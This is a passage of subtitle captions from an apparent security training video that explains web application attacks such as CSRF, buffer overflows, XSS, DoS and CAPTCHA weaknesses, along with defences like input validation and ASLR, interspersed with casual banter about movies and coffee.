there.\n\n489\n00:24:59.130 --> 00:25:02.570\nJava, VB, ActiveX, HTML,\nwho knows what right?\n\n490\n00:25:02.570 --> 00:25:05.090\nAnything today that's web\nenabled essentially is code,\n\n491\n00:25:05.090 --> 00:25:06.448\npotentially can be compromised.\n\n492\n00:25:06.448 --> 00:25:08.750\nWe have cross-site request forgeries.\n\n493\n00:25:08.750 --> 00:25:11.250\nSo when we're thinking about\nthis we're going in and\n\n494\n00:25:11.250 --> 00:25:14.080\nallowing attackers to force,\nas you could see, a user's\n\n495\n00:25:14.080 --> 00:25:18.240\nbrowser to send malicious requests that\nthey did not intend or were not aware of.\n\n496\n00:25:18.240 --> 00:25:19.750\nWe take over the browser and\n\n497\n00:25:19.750 --> 00:25:22.900\nwe use it to get up to no good\nby pretending to be the user.\n\n498\n00:25:22.900 --> 00:25:25.745\nSo, in effect it's almost like we're\nassuming their identity, right?\n\n499\n00:25:25.745 --> 00:25:28.285\nTo then execute attacks and\nthings like that or\n\n500\n00:25:28.285 --> 00:25:30.870\nengage in activity that\nwe should not be doing.\n\n501\n00:25:30.870 --> 00:25:33.236\nWe'll be able to go and\nwe manipulate the active session,\n\n502\n00:25:33.236 --> 00:25:35.820\nthat's what we talked about\na little bit further down.\n\n503\n00:25:35.820 --> 00:25:40.505\nSending the user or creating a secondary\nsession to a malicious site.\n\n504\n00:25:40.505 --> 00:25:44.875\nWhich then, through injection attacks,\nwill inject some sort of attack code.\n\n505\n00:25:44.875 --> 00:25:48.155\nAnd so we have a split set of sessions.\n\n506\n00:25:48.155 --> 00:25:52.017\nThe user's in a good session thinking\nthey're okay, checking their bank balance.\n\n507\n00:25:52.017 --> 00:25:55.247\nAnd as the same time we're manipulating\nthe system as we're injecting code from\n\n508\n00:25:55.247 --> 00:25:56.647\na bad website.\n\n509\n00:25:56.647 --> 00:25:57.487\nRight?\nAnd so\n\n510\n00:25:57.487 --> 00:26:00.457\nbetween the two obviously\nthat's a lot of bad stuff.\n\n511\n00:26:00.457 --> 00:26:02.282\nAnd then we have buffer overflows.\n\n512\n00:26:02.282 --> 00:26:03.537\nWe've talked about this already.\n\n513\n00:26:03.537 --> 00:26:08.433\nThe idea of buffer overflows is the idea\nof injecting more data into the system.\n\n514\n00:26:08.433 --> 00:26:12.883\nAnd however we do it in whatever form,\nwe dump more data in than\n\n515\n00:26:12.883 --> 00:26:16.863\nthe holding container is designed\nto process in any one time.\n\n516\n00:26:16.863 --> 00:26:18.933\nAnd you could see this in the real world,\nright?\n\n517\n00:26:18.933 --> 00:26:20.660\nThis is like science 101.\n\n518\n00:26:20.660 --> 00:26:24.720\nSo you've got lab coats, we put on our\nlab coats and be like Mr. Science.\n\n519\n00:26:24.720 --> 00:26:26.855\nSo Bill Nye the Science Guy, right?\n\n520\n00:26:26.855 --> 00:26:27.900\n&gt;&gt; [LAUGH]\n&gt;&gt; So\n\n521\n00:26:27.900 --> 00:26:30.280\nif you're dumping I mean just imagine\ndoing this, you can do this at home,\n\n522\n00:26:30.280 --> 00:26:31.380\nit's very simple.\n\n523\n00:26:31.380 --> 00:26:35.360\nJust get a glass, get a pitcher of water,\nput the glass in the sink so\n\n524\n00:26:35.360 --> 00:26:38.540\nwhen you make a mess you don't get\neverything all over the place.\n\n525\n00:26:38.540 --> 00:26:41.040\nBut if you dump the water\ninto the glass and\n\n526\n00:26:41.040 --> 00:26:43.470\nthere is no hole in the glass\nto drain the water out.\n\n527\n00:26:43.470 --> 00:26:46.310\nAt some point you're gonna fill the glass,\nessentially to the top.\n\n528\n00:26:46.310 --> 00:26:51.330\nAnd then the next pour is gonna just dump\nwater everywhere outside of the glass.\n\n529\n00:26:51.330 --> 00:26:54.090\nIf you think of the glass as the buffer,\nspace and\n\n530\n00:26:54.090 --> 00:26:56.530\nmemory, is usually what we\ntalk about with a buffer.\n\n531\n00:26:56.530 --> 00:26:59.070\nIf you assume the glass is the buffer and\n\n532\n00:26:59.070 --> 00:27:02.610\nthe glass, let's say,\nhypothetically is only so big.\n\n533\n00:27:02.610 --> 00:27:05.150\nCan I get that to do my face?\n\n534\n00:27:05.150 --> 00:27:05.833\n&gt;&gt; Yeah there you go.\n\n535\n00:27:05.833 --> 00:27:09.569\n[LAUGH]\n&gt;&gt; Look it's me.\n\n536\n00:27:09.569 --> 00:27:11.295\nI'm so cute.\n\n537\n00:27:11.295 --> 00:27:13.823\n&gt;&gt; [LAUGH]\n&gt;&gt; Yes.\n\n538\n00:27:13.823 --> 00:27:19.230\nSo if we fill up the buffer then obviously\nthe memory space is being allocated and\n\n539\n00:27:19.230 --> 00:27:21.246\nfully consumed in the system.\n\n540\n00:27:21.246 --> 00:27:25.450\nAll the information that's\nthere is being processed.\n\n541\n00:27:25.450 --> 00:27:30.070\nAnd we have a drain at the bottom of the\nbuffer, essentially, think of a bathtub.\n\n542\n00:27:30.070 --> 00:27:33.390\nThere is a hole at the bottom\nwhere memory content comes in,\n\n543\n00:27:33.390 --> 00:27:36.250\ngets processed through the stack,\nand does drain out the bottom.\n\n544\n00:27:36.250 --> 00:27:39.775\nBut the problem is,\nit's a physics problem, right?\n\n545\n00:27:39.775 --> 00:27:41.740\n[LAUGH] You only have a certain\namount of flow in and\n\n546\n00:27:41.740 --> 00:27:45.050\na certain amount of flow out\nbased on rate and based on time.\n\n547\n00:27:45.050 --> 00:27:49.280\nAnd if we overwhelm the system's\nability to drain the buffer as we're\n\n548\n00:27:49.280 --> 00:27:52.830\nputting more input in,\nwe get to a point where we top out.\n\n549\n00:27:52.830 --> 00:27:55.230\nAnd when we top out,\nwe overflow the buffer.\n\n550\n00:27:55.230 --> 00:27:57.880\nAnd I'm oversimplifying\nthe mechanics of this but\n\n551\n00:27:57.880 --> 00:27:59.690\nit's really not much more than that.\n\n552\n00:27:59.690 --> 00:28:03.270\nAll we do is add in the code on the top\nand say, well this is the exploit code.\n\n553\n00:28:03.270 --> 00:28:06.740\nWe're gonna dump this amount of\ndata against these buffers and\n\n554\n00:28:06.740 --> 00:28:07.900\ntrying to overflow them.\n\n555\n00:28:07.900 --> 00:28:13.000\nSo there's a little bit of additional whiz\nbang wizardry we've got to engage in here.\n\n556\n00:28:13.000 --> 00:28:15.380\nBut it's essentially not\nmuch more than that.\n\n557\n00:28:15.380 --> 00:28:18.290\nThe trick here is to figure\nout how much code we have to\n\n558\n00:28:18.290 --> 00:28:21.420\ndump in to overflow the buffer and\nwhat buffers are vulnerable.\n\n559\n00:28:21.420 --> 00:28:24.060\nAnd that gets into some additional\nthings that you would have to obviously\n\n560\n00:28:24.060 --> 00:28:24.970\nlearn about.\n\n561\n00:28:24.970 --> 00:28:28.240\nBut, there are defense\nmechanisms against this.\n\n562\n00:28:28.240 --> 00:28:32.240\nWe use ASLR, address space layout\nrandomization in most systems today,\n\n563\n00:28:32.240 --> 00:28:34.575\nto move data around so\nthat it's hidden in memory.\n\n564\n00:28:34.575 --> 00:28:38.300\nSo it's chopped up, essentially, it's\nharder to find where the system stores it.\n\n565\n00:28:38.300 --> 00:28:41.680\nSo we don't necessarily know what\nbuffers are in use at all times.\n\n566\n00:28:41.680 --> 00:28:45.040\nBuffers do have overflow\nprotection associated with them in\n\n567\n00:28:45.040 --> 00:28:45.910\nmany architectures.\n\n568\n00:28:45.910 --> 00:28:49.490\nSo that when we get close to overflowing\nwe may be able to slow down or\n\n569\n00:28:49.490 --> 00:28:51.470\nregulate certain things to prevent input.\n\n570\n00:28:51.470 --> 00:28:52.950\nThere's a lot of ways we could stop this.\n\n571\n00:28:52.950 --> 00:28:53.600\nBut ultimately,\n\n572\n00:28:53.600 --> 00:28:57.470\nif we're not doing input validation and\nwe're not doing boundary checking.\n\n573\n00:28:57.470 --> 00:29:00.510\nSo we're not just saying,\nhey, a 255 character limit.\n\n574\n00:29:00.510 --> 00:29:04.190\nNot unlimited in a data field.\n\n575\n00:29:04.190 --> 00:29:07.390\nThen we are very likely to fall\nprey to this kind of attack.\n\n576\n00:29:07.390 --> 00:29:10.900\nSo that is something to consider and\nobviously something for us to be aware of.\n\n577\n00:29:10.900 --> 00:29:12.860\nSo you want to be aware of all\nthese different kind of attacks.\n\n578\n00:29:12.860 --> 00:29:14.350\nIt's very, very important.\n\n579\n00:29:14.350 --> 00:29:17.770\nWe've got so many of them that\nwe have to address and so\n\n580\n00:29:17.770 --> 00:29:19.580\nmany of them that we wanna be aware of.\n\n581\n00:29:19.580 --> 00:29:21.180\nAnd remember, there are more of them.\n\n582\n00:29:21.180 --> 00:29:23.060\nRight?\nThis is not the definitive list.\n\n583\n00:29:23.060 --> 00:29:25.605\nYou can have file injection attacks for\ninstance.\n\n584\n00:29:25.605 --> 00:29:29.616\nWhere we're manipulating files and\nthose files then become the vehicle,\n\n585\n00:29:29.616 --> 00:29:30.900\nthe delivery vehicle.\n\n586\n00:29:30.900 --> 00:29:32.660\nIt's not just command injections,\n\n587\n00:29:32.660 --> 00:29:36.190\nit's not just SQL injections,\nnot just LDAP injections.\n\n588\n00:29:36.190 --> 00:29:38.950\nThere's all sorts of additional\nstuff that may go on there.\n\n589\n00:29:38.950 --> 00:29:41.730\nWe could do cross site\nscripting attacks via email.\n\n590\n00:29:41.730 --> 00:29:44.370\nWe could steal users'\ncookies to execute them.\n\n591\n00:29:44.370 --> 00:29:45.585\nThere's all these different ways.\n\n592\n00:29:45.585 --> 00:29:49.040\nWe can send an unauthorized\nrequest trying to fool the system.\n\n593\n00:29:49.040 --> 00:29:51.720\nWe could put blog postings up that\n\n594\n00:29:51.720 --> 00:29:54.480\nhave cross-site scripting\nexecution code in them.\n\n595\n00:29:54.480 --> 00:29:56.250\nThis is becoming very common today,\n\n596\n00:29:56.250 --> 00:30:02.070\nwhere people are posting code in\ntheir blogs, for a variety of things.\n\n597\n00:30:02.070 --> 00:30:03.940\nHey, you wanna mirror this blog?\n\n598\n00:30:03.940 --> 00:30:06.320\nDownload this code so\nyou can link it, and whatever.\n\n599\n00:30:06.320 --> 00:30:08.550\nA lot of that's legitimate,\nbut sometimes it's not.\n\n600\n00:30:08.550 --> 00:30:10.420\nAnd if you're not paying\nattention to the code,\n\n601\n00:30:10.420 --> 00:30:13.640\nyou may actually get\nunfortunately taken in, right?\n\n602\n00:30:13.640 --> 00:30:16.580\nYou could this in the comment field,\nyou could do cross-site scripting attacks\n\n603\n00:30:16.580 --> 00:30:19.446\nthrough comment fields on websites,\nthrough blog posts.\n\n604\n00:30:19.446 --> 00:30:22.110\nThere's just all sorts of ways to do this.\n\n605\n00:30:22.110 --> 00:30:26.620\nI know I had asked you to bring up\na website, the XXSED website, right?\n\n606\n00:30:26.620 --> 00:30:27.990\nIf we take a look at that real quick.\n\n607\n00:30:27.990 --> 00:30:30.910\nSo this website is a web archive of,\n\n608\n00:30:30.910 --> 00:30:33.510\ncan we just go full screen so\nthey can see a little bit better?\n\n609\n00:30:33.510 --> 00:30:34.270\nThere we go.\nThank you.\n\n610\n00:30:34.270 --> 00:30:38.990\nSo, this is a website that\nallows us to see XSS archives.\n\n611\n00:30:38.990 --> 00:30:41.920\nIn other words, websites that have been\nvulnerable to cross-site scripting\n\n612\n00:30:41.920 --> 00:30:44.360\nat some point in the past.\n\n613\n00:30:44.360 --> 00:30:46.900\nThey may or may not be now but\nthere are lists of them there.\n\n614\n00:30:46.900 --> 00:30:48.250\nIt's a well known website.\n\n615\n00:30:48.250 --> 00:30:52.480\nA lot of times either from a security\nperspective we'll use this to validate\n\n616\n00:30:52.480 --> 00:30:55.000\ncertain websites and make sure they do or\ndon't have vulnerabilities.\n\n617\n00:30:55.000 --> 00:30:58.480\nOr if they did that we can then go in and\ncheck and\n\n618\n00:30:58.480 --> 00:30:59.585\nsee whether they’ve been patched.\n\n619\n00:30:59.585 --> 00:31:03.370\nFrom a pen testing perspective, this is\none of the places I'll go to figure out\n\n620\n00:31:03.370 --> 00:31:08.310\nwhether or\nnot we will be going up against a company.\n\n621\n00:31:08.310 --> 00:31:10.630\nOr up against a website\nthat may be vulnerable.\n\n622\n00:31:10.630 --> 00:31:14.070\nAnd you better believe that hackers\nare looking at sites like this\n\n623\n00:31:14.070 --> 00:31:17.750\nto figure out that there is\nessentially a hit list, right.\n\n624\n00:31:17.750 --> 00:31:23.830\nA black book of websites out there that\npotentially can be used for compromise.\n\n625\n00:31:23.830 --> 00:31:24.920\nSo this is an interesting one.\n\n626\n00:31:24.920 --> 00:31:26.480\nYou may or\nmay not have been aware of this one.\n\n627\n00:31:26.480 --> 00:31:29.530\nI don't know that necessarily you knew\nabout it when I told you about it.\n\n628\n00:31:29.530 --> 00:31:32.215\nSo it's not the kind of thing that\neverybody in the world knows about but\n\n629\n00:31:32.215 --> 00:31:34.020\ncertainly there are sites\nlike this out there.\n\n630\n00:31:34.020 --> 00:31:35.799\nSo it's just something to consider.\n\n631\n00:31:35.799 --> 00:31:39.472\nWe may be doing denial of service\napplications against a website and\n\n632\n00:31:39.472 --> 00:31:41.411\ntrying to take it down through DOS.\n\n633\n00:31:41.411 --> 00:31:44.819\nWe talked about that in\nthe DOS episodes or DDOS.\n\n634\n00:31:44.819 --> 00:31:47.654\nAnd we It really depend on\nwhat we're trying to do, but\n\n635\n00:31:47.654 --> 00:31:51.231\nresource exhaustion is very common\nset of attacks that we would often\n\n636\n00:31:51.231 --> 00:31:55.010\nexecute against websites, in this area and\nof course against web apps.\n\n637\n00:31:55.010 --> 00:31:58.210\nIf could continue to cycle them and\njust have them suck more and\n\n638\n00:31:58.210 --> 00:32:00.720\nmore resources out of\nthe system over time.\n\n639\n00:32:00.720 --> 00:32:04.940\nThat web's sites essential gonna go down\nor that backend system will go down.\n\n640\n00:32:04.940 --> 00:32:06.530\nWe want to be thinking about that as well.\n\n641\n00:32:06.530 --> 00:32:09.310\nWe could do a cookie or session poisoning,\n\n642\n00:32:09.310 --> 00:32:12.550\nthat's another one we didn't really\ntalk about per se but could happen.\n\n643\n00:32:12.550 --> 00:32:16.110\nWe've mentioned session fixation\nattacks in other episodes.\n\n644\n00:32:16.110 --> 00:32:18.700\nCaptcha attacks,\nHow to you feel about captcha?\n\n645\n00:32:18.700 --> 00:32:20.560\n&gt;&gt; Captcha.\n&gt;&gt; I happen to hate that way\n\n646\n00:32:20.560 --> 00:32:21.390\nlike a passion.\n\n647\n00:32:21.390 --> 00:32:25.310\nPersonally, but it is, look,\nit's a legitimate thing.\n\n648\n00:32:25.310 --> 00:32:26.260\nI understand why they do it.\n\n649\n00:32:26.260 --> 00:32:27.160\nIt makes a lot of sense.\n\n650\n00:32:27.160 --> 00:32:29.280\nBut have you seen the ones\nwhere like now they ask you,\n\n651\n00:32:29.280 --> 00:32:32.530\nthey put up like 20 different wildlife\nsites or wildlife scenes or something,\n\n652\n00:32:32.530 --> 00:32:35.250\npick out the one that Deer Hunter's in or\nsomething crazy like that?\n\n653\n00:32:35.250 --> 00:32:35.793\n&gt;&gt; Seen that one.\n&gt;&gt; Or\n\n654\n00:32:35.793 --> 00:32:38.691\nthey have one that says show me\nevery building that is billboards so\n\n655\n00:32:38.691 --> 00:32:41.969\nyou have to click on different pictures\nand you have ones with billboards.\n\n656\n00:32:41.969 --> 00:32:45.953\nAnd there is like one\nwith a billboard in it.\n\n657\n00:32:45.953 --> 00:32:48.260\nAnd maybe seven,\neight ten pictures whatever.\n\n658\n00:32:48.260 --> 00:32:50.410\nBut there's just random pictures as stuff.\n\n659\n00:32:53.040 --> 00:32:57.045\nOkay whatever I mean I get the fact\nthat you wanna know am not a robot but\n\n660\n00:32:57.045 --> 00:33:01.468\nyou know the reality is that while it\nworks these things are also potentially\n\n661\n00:33:01.468 --> 00:33:04.047\nbreachable there are issues with Captcha.\n\n662\n00:33:04.047 --> 00:33:06.790\nYou can manipulate server\nside implementation,.\n\n663\n00:33:06.790 --> 00:33:09.040\nYou can attack the image itself.\n\n664\n00:33:09.040 --> 00:33:10.760\nYou can manipulate the images.\n\n665\n00:33:10.760 --> 00:33:13.090\nIt's all this stuff you can do and\n\n666\n00:33:13.090 --> 00:33:16.590\nso you just have to think about\nthe fact that while it's nice\n\n667\n00:33:16.590 --> 00:33:20.650\nit doesn't necessarily provide total\nprotection is what I'm suggesting.\n\n668\n00:33:20.650 --> 00:33:22.660\nInsufficient transport layer protections.\n\n669\n00:33:22.660 --> 00:33:25.550\nWe talked about these in many\nof our episodes as well.\n\n670\n00:33:25.550 --> 00:33:28.120\nWeak algorithms being used for encryption.\n\n671\n00:33:28.120 --> 00:33:29.890\nMan in middle attacks can happen.\n\n672\n00:33:29.890 --> 00:33:34.380\nSo obviously, if we're not careful we\ncan be manipulating the data stream.\n\n673\n00:33:34.380 --> 00:33:37.990\nData can be exposed through\nuntrusted third party use.\n\n674\n00:33:37.990 --> 00:33:41.660\nI've mentioned improper error handling and\nhow that can happen.\n\n675\n00:33:41.660 --> 00:33:46.030\nI love when I go to a site and we get the\nhey sorry, we're not doing stuff today.\n\n676\n00:33:46.030 --> 00:33:48.145\nYou get the yellow SQL error page, right.\n\n677\n00:33:48.145 --> 00:33:51.470\nAnd we're showing you not only what\nthe databases on the backend, but\n\n678\n00:33:51.470 --> 00:33:53.197\nobviously what they type\nof architecture is.\n\n679\n00:33:53.197 --> 00:33:53.880\n&gt;&gt; [LAUGH] Right.\n\n680\n00:33:53.880 --> 00:33:55.800\n&gt;&gt; There's a lot of information\non those error pages.\n\n681\n00:33:55.800 --> 00:33:58.290\nSo Insecure cryptographic storage.\n\n682\n00:33:58.290 --> 00:34:03.770\nWe're not encrypting data on the wire\nand/or in storage at rest and in use.\n\n683\n00:34:03.770 --> 00:34:04.780\nAnd that can be an issue.\n\n684\n00:34:05.910 --> 00:34:06.960\nBroken authentication.\n\n685\n00:34:06.960 --> 00:34:10.850\nWe mentioned this is one the issues\non the O auth's top ten.\n\n686\n00:34:10.850 --> 00:34:14.030\nWe mentioned unvalidated redirects and\nforwards right we talked about those.\n\n687\n00:34:14.030 --> 00:34:16.645\nJust trying to make sure I go\ndown my mental hit list here.\n\n688\n00:34:16.645 --> 00:34:18.370\n&gt;&gt; [LAUGH]\n&gt;&gt; Making sure we hit everything.\n\n689\n00:34:18.370 --> 00:34:21.490\nWhat about web services attacks overall?\n\n690\n00:34:21.490 --> 00:34:26.100\nJust thinking about up and down the layer,\nlayers rather excuse me of the OSI model.\n\n691\n00:34:26.100 --> 00:34:28.830\nAnd the web service stack we\nhad the presentation layer,\n\n692\n00:34:28.830 --> 00:34:31.700\nwe have discovery access\ntransport security.\n\n693\n00:34:31.700 --> 00:34:35.860\nWe have not the OSI model but\njust the web services themselves right.\n\n694\n00:34:35.860 --> 00:34:39.160\nWe think about the fact that there's\nkind of a similar thought process right.\n\n695\n00:34:39.160 --> 00:34:42.050\nYou have the layer where we do the\npresentation, you have a layer where we\n\n696\n00:34:42.050 --> 00:34:45.530\ndo security WS security web\nservice security whatever it is.\n\n697\n00:34:45.530 --> 00:34:49.930\nYou've got an area where you're doing some\ndiscovery you have like things like UDDI\n\n698\n00:34:49.930 --> 00:34:53.940\nand UWSDL happening at this layer to be\nable to figure out what's going on there.\n\n699\n00:34:53.940 --> 00:34:59.470\nYou have an access layer where you have\nAPIs like SOAP and REST so RESTful APIs.\n\n700\n00:34:59.470 --> 00:35:02.650\nYou've got a transport layer that's\njust our generic networking.\n\n701\n00:35:02.650 --> 00:35:04.890\nSo you've got your\nprotocols happening there.\n\n702\n00:35:04.890 --> 00:35:08.690\nI'm seeing up and down these different\nareas of functionality from the web server\n\n703\n00:35:08.690 --> 00:35:11.360\nstack, we can execute attacks.\n\n704\n00:35:11.360 --> 00:35:15.800\nIf you think about the fact that we\nmight be vulnerable in one area with\n\n705\n00:35:15.800 --> 00:35:20.070\none kind of operation, but secure in\nanother, this can lead to complications,\n\n706\n00:35:20.070 --> 00:35:24.350\ndepending on the APIs you use, you may be\nvulnerable to certain kinds of attacks.\n\n707\n00:35:24.350 --> 00:35:26.360\nDepending on the language you're using,\n\n708\n00:35:26.360 --> 00:35:28.580\nyou may be vulnerable to\ncertain kinds of attacks right?\n\n709\n00:35:28.580 --> 00:35:32.980\nSo, we have to think about the fact\nthat today SQL is a very common\n\n710\n00:35:32.980 --> 00:35:37.450\nlanguage regardless of what platform\nyou use whether it's post grass,\n\n711\n00:35:37.450 --> 00:35:41.610\nwhether it's open, whether it's NoSQL,\nwhether it's Microsoft SQL,\n\n712\n00:35:41.610 --> 00:35:44.380\nthere's all these different\nvariations of the language.\n\n713\n00:35:44.380 --> 00:35:48.530\nBut the reality is that ultimately almost\neverybody implements SQL in some form.\n\n714\n00:35:48.530 --> 00:35:50.180\nI mean, it's that common.\n\n715\n00:35:50.180 --> 00:35:55.370\nIt's like saying, everybody has a Windows\ndevice on their desktop at the office.\n\n716\n00:35:55.370 --> 00:35:56.900\nBecause almost everybody does.\n\n717\n00:35:56.900 --> 00:35:59.252\nThere are certainly systems\nthat don't run Windows.\n\n718\n00:35:59.252 --> 00:36:02.030\nBut 90 something percent\nof the enterprise today,\n\n719\n00:36:02.030 --> 00:36:05.650\nwhatever that number is, is running\nWindows based operating systems.\n\n720\n00:36:05.650 --> 00:36:08.490\nThat's how prevalent SQL is,\nif you think about it.\n\n721\n00:36:08.490 --> 00:36:11.210\nNot because it's tied to Windows,\njust generically because it's just so\n\n722\n00:36:11.210 --> 00:36:13.550\nprevalent across all\nthe web servers we create.\n\n723\n00:36:13.550 --> 00:36:16.890\nIt exists outside of Windows\nin many many forms in the non\n\n724\n00:36:16.890 --> 00:36:18.480\nWindows space just to be aware of that.\n\n725\n00:36:18.480 --> 00:36:22.920\nBut the point is, we can up and down these\ndifferent layers of the web services\n\n726\n00:36:22.920 --> 00:36:28.100\nstack, see attacks propagating and\nwe wanna be aware of that not because\n\n727\n00:36:28.100 --> 00:36:32.990\nwe necessarily can go in and\nmicromanage every layer and we can,\n\n728\n00:36:32.990 --> 00:36:36.230\nthat may or may not be practical but\nmy point is, we have to understand\n\n729\n00:36:36.230 --> 00:36:39.410\nthat it's not just about saying, okay,\nI'm using HTTPS, so I'm secure, right.\n\n730\n00:36:39.410 --> 00:36:42.010\nBecause that's what some people may say.\n\n731\n00:36:42.010 --> 00:36:45.180\nI'm secure on my transport, so\nI don't have to worry about anything else.\n\n732\n00:36:45.180 --> 00:36:49.820\nWell, using HTTPS doesn't protect\nyou from SQL command injection,\n\n733\n00:36:49.820 --> 00:36:52.140\ndoes not protect you or stop overflows.\n\n734\n00:36:52.140 --> 00:36:55.770\nAll it does is encrypt the traffic\nthat's being transmitted between you and\n\n735\n00:36:55.770 --> 00:36:58.990\nthe attacker, which may or may not make\nit easier or harder to find, right,\n\n736\n00:36:58.990 --> 00:37:02.200\ndepending on what we're doing\nfrom a networking perspective.\n\n737\n00:37:02.200 --> 00:37:05.030\nBut it doesn't do anything\nto prevent SQL injection.\n\n738\n00:37:05.030 --> 00:37:05.770\nQuite the opposite.\n\n739\n00:37:05.770 --> 00:37:10.150\nIt has no effect at all, right,\ncuz we can inject code through a encrypted\n\n740\n00:37:10.150 --> 00:37:13.090\ntransmission the same way we came\nthrough a non encrypted transmission.\n\n741\n00:37:13.090 --> 00:37:14.210\nThere's no difference there.\n\n742\n00:37:14.210 --> 00:37:15.880\n&gt;&gt; They're gonna be nice and\nprotect our attack.\n\n743\n00:37:15.880 --> 00:37:18.380\n&gt;&gt; Well, we're just gonna hide\nwhat we're doing from them, so\n\n744\n00:37:18.380 --> 00:37:21.980\nthey don't feel bad that they haven't\nbeen invited to the injection party, but\n\n745\n00:37:21.980 --> 00:37:25.140\nother than that,\nit has absolutely no bearing on it at all.\n\n746\n00:37:25.140 --> 00:37:29.640\nSo, my point is, you can feel secure or\nyou can be secure.\n\n747\n00:37:29.640 --> 00:37:31.870\nAnd there's two very different approaches.\n\n748\n00:37:31.870 --> 00:37:36.570\nIn order to be secure you've gotta work up\nand down the multiple layers of the web\n\n749\n00:37:36.570 --> 00:37:41.940\napplication web services interface and\nthe back end control to the data\n\n750\n00:37:41.940 --> 00:37:45.410\nsegment in order to really understand\nhow to create a secure environment.\n\n751\n00:37:45.410 --> 00:37:49.910\nTo think you're secure,\nyou can simply just use a browser\n\n752\n00:37:49.910 --> 00:37:53.390\nthat supports a secure protocol,\nand assume everything will be fine.\n\n753\n00:37:53.390 --> 00:37:57.530\nAnd unfortunately a lot of people\nfall into the second category,\n\n754\n00:37:57.530 --> 00:38:00.650\nwhere they've been told for\nwhatever reason, however we got there,\n\n755\n00:38:00.650 --> 00:38:05.050\nthat they are secure, and as a result\nof that, that what they do is secure,\n\n756\n00:38:05.050 --> 00:38:08.840\njust keeping our lab environment active\nfor you guys for our next demo and\n\n757\n00:38:08.840 --> 00:38:11.700\nboy have we got a humdinger for\nyou, let me tell you what.\n\n758\n00:38:11.700 --> 00:38:13.220\nHave you used that terminology by the way?\n\n759\n00:38:13.220 --> 00:38:14.470\nThat's like a southern thing.\n\n760\n00:38:14.470 --> 00:38:15.960\n&gt;&gt; It is, it is.\n\n761\n00:38:15.960 --> 00:38:18.800\nI've said it once or twice but\nI've lived in Alabama before.\n\n762\n00:38:18.800 --> 00:38:20.170\n&gt;&gt; Were there banjos playing\nwhen you said that or\n\n763\n00:38:20.170 --> 00:38:22.330\nI don't know if that maybe I don't know.\n\n764\n00:38:22.330 --> 00:38:23.340\n&gt;&gt; In the background.\n\n765\n00:38:23.340 --> 00:38:25.090\n&gt;&gt; The whole deliverance thing.\n\n766\n00:38:25.090 --> 00:38:28.510\nThere's another good movie, talking about\ngood movies that was a great movie.\n\n767\n00:38:28.510 --> 00:38:31.910\nThankfully a movie that nobody has ever\nfelt they should remake because it's so\n\n768\n00:38:31.910 --> 00:38:34.190\ngood I don't know that you could\nreally do justice to that one.\n\n769\n00:38:34.190 --> 00:38:35.730\nWe've had the whole Ben Hurr conversation.\n\n770\n00:38:35.730 --> 00:38:38.190\n&gt;&gt; You know what, I saw the Ben Hurr\ncommercial the other night and\n\n771\n00:38:38.190 --> 00:38:39.750\nI of course thought of you and\nwhat you had said.\n\n772\n00:38:39.750 --> 00:38:42.970\n&gt;&gt; When you think about the fact\nthat they put just about\n\n773\n00:38:42.970 --> 00:38:47.090\nmega star actor currently around now,\nin that movie.\n\n774\n00:38:47.090 --> 00:38:52.340\nMorgan Freeman is in there, he plays\nthe guy who's training the slaves,\n\n775\n00:38:52.340 --> 00:38:54.970\nhe's the head slave master whatever it is.\n\n776\n00:38:54.970 --> 00:38:58.960\nAnd they've got just these massive,\nmassive stars in there.\n\n777\n00:38:58.960 --> 00:39:00.710\nAnd it's not that the acting is bad.\n\n778\n00:39:00.710 --> 00:39:05.210\nIt's just that you can't remake\na movie like that and do it better.\n\n779\n00:39:05.210 --> 00:39:10.170\nI mean because they do all these crazy,\n3D, super special digital effects\n\n780\n00:39:10.170 --> 00:39:13.350\nwith the race and all this stuff I mean\nlisten, when they did it for real and\n\n781\n00:39:13.350 --> 00:39:16.100\nthey actually have the chariots and\nthe stunt guys.\n\n782\n00:39:16.100 --> 00:39:18.750\nThey did it for the first time and\nthey did all that for\n\n783\n00:39:18.750 --> 00:39:21.020\nreal back in the 60s\nwhen they made the movie.\n\n784\n00:39:21.020 --> 00:39:22.970\nThat was cool cuz you knew it was real.\n\n785\n00:39:22.970 --> 00:39:26.870\nIt wasn't like a digitally\nanimated horse and chariot and\n\n786\n00:39:26.870 --> 00:39:30.390\nthey didn't go crash into the wall and\njust, it was real.\n\n787\n00:39:30.390 --> 00:39:32.030\nIf they crash, they crashed, right?\n\n788\n00:39:32.030 --> 00:39:34.660\nAnd so it was some things\nyou just can't make better.\n\n789\n00:39:34.660 --> 00:39:36.580\nI don't know, I guess,\nI'm a purist, I suppose.\n\n790\n00:39:36.580 --> 00:39:37.220\n&gt;&gt; You are.\n&gt;&gt; Either that or\n\n791\n00:39:37.220 --> 00:39:40.105\nI'm an incredibly, incredibly bitter.\n\n792\n00:39:40.105 --> 00:39:42.300\n&gt;&gt; [LAUGH]\n&gt;&gt; Maybe a combination of those.\n\n793\n00:39:42.300 --> 00:39:42.856\n&gt;&gt; Maybe a little bit of both, yeah.\n\n794\n00:39:42.856 --> 00:39:43.721\n&gt;&gt; Maybe a little bit of both.\n\n795\n00:39:43.721 --> 00:39:45.851\nI had to wait in line for\ncoffee this morning again.\n\n796\n00:39:45.851 --> 00:39:48.691\nI was not happy, no, not happy.\n\n797\n00:39:48.691 --> 00:39:51.859\nI don't know, and they're doing this\nwhole Starbucks for Life thing now.\n\n798\n00:39:51.859 --> 00:39:52.718\nRight?\n\n799\n00:39:52.718 --> 00:39:54.450\nThey've got this,\nI don't know if you've hear about this.\n\n800\n00:39:54.450 --> 00:39:57.430\nIt'll be over by the time you actually\nthis unless you're watching us live right\n\n801\n00:39:57.430 --> 00:39:59.570\nnow, so disregard this.\n\n802\n00:39:59.570 --> 00:40:01.475\nBut they're actually\nrunning this competition.\n\n803\n00:40:01.475 --> 00:40:04.030\nIt's like a month thing where\nevery time you buy something\n\n804\n00:40:04.030 --> 00:40:06.620\nyou get like a game piece and\nso it's digital so\n\n805\n00:40:06.620 --> 00:40:10.210\nit goes into your account, but\nthen you can play and it's cool cuz you\n\n806\n00:40:10.210 --> 00:40:12.655\nhave to go melt the ice cube to see\nthe game piece that you're clicking.\n\n807\n00:40:12.655 --> 00:40:13.610\nmelting the ice cube.\n\n808\n00:40:13.610 --> 00:40:15.530\nI get excited about the really\nsmall things in life.\n\n809\n00:40:15.530 --> 00:40:18.242\nYou get to a certain age and just,\nthat's all you gotta look forward to.\n\n810\n00:40:18.242 --> 00:40:19.996\n[CROSSTALK]\n&gt;&gt; I saw you clicking like mad\n\n811\n00:40:19.996 --> 00:40:20.720\nthe other day.\n\n812\n00:40:20.720 --> 